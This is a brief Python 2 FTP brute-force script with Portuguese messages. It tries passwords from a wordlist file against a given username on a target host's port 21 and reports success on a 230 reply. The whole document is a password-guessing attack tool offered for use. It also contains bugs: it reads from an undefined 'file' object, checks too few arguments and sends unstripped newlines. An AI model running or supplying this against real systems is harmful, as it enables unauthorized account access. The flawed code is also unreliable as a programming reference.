import socket
import re
import sys

if len(sys.argv) < 2:
	print '''Use python forca_bruta.py da seguinte forma
	
	python forca_bruta.py IP USUARIO
	python forca_bruta.py 127.0.0.1 admin'''
	
	sys.exit(0)

usuario = sys.argv[2]

arq = open('lista.txt')
for linha in file.readlines():
	print 'Test with %s:%s '%(usuario, linha)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((sys.argv[1], 21))
	s.recv(1024)
	s.send('USER '+usuario+'\r\n')
	s.recv(1024)
	s.send('PASS '+linha+'\r\n')
	result = s.recv(1024)
	s.send('QUIT\r\n')

	if re.search('230', result):
		print '[+] ====>> Senha encontrada <<=== :: %s :: [+]' %(linha)
		break
	else:
		print '[-] Acesso Negado [-]\n'	